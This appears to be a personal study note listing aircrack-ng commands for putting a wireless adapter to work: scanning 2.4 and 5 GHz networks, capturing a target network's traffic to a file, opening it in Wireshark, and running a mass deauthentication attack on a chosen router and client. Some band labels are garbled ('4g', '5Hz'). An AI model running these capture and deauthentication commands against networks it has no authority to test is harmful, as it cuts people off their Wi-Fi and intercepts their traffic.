[Back](..)

after activating monitor mode\
airodump-ng --band abg <wireless adaptor in mon mode> will search for all 5g and 4g networks\
airodump-ng wlan0 for only 4g or 2.4Hz networks\
airodump-ng --band a <wireless adaptor in mon mode> for 5g or 5Hz networks\
airodump-ng --bssid <bssid of target> --channel <channel no> --write <name/location of file to write on> <wireless mon mode> to start collecting data\
^c to stop\
wireshark to elaborate the cap file on opening

aireplay-ng --deauth 1000000 -a <router mac> -c <client mac> <adapter in mon> will start deauth attacks \
client mac can be any one of the several clients connected to the router we targeted.

[Back](..)